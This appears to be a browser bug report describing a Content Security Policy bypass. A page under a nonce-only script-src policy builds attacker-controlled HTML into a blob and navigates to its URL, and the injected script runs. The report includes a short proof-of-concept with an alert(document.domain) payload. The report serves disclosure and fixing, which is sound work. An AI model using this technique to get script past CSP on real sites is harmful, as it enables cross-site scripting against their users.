Steps to reproduce the problem:
1. Go to https://test.shhnjk.com/blobCSP.html

What is the expected behavior?
Script is blocked by CSP "script-src 'nonce-test'" (Firefox does).

What went wrong?
CSP is bypassed. Note that if the same blob URL is set to iframe or opened to new window, that's blocked correctly.

Source:
<meta http-equiv="content-security-policy" content="script-src 'nonce-test'">
<script nonce="test">
var attackerControlledString = "<script>alert(document.domain)<\/script>";
var blob = new Blob([attackerControlledString], {type : 'text/html'});
var url = URL.createObjectURL(blob);
location.href=url;
</script>

Did this work before? N/A
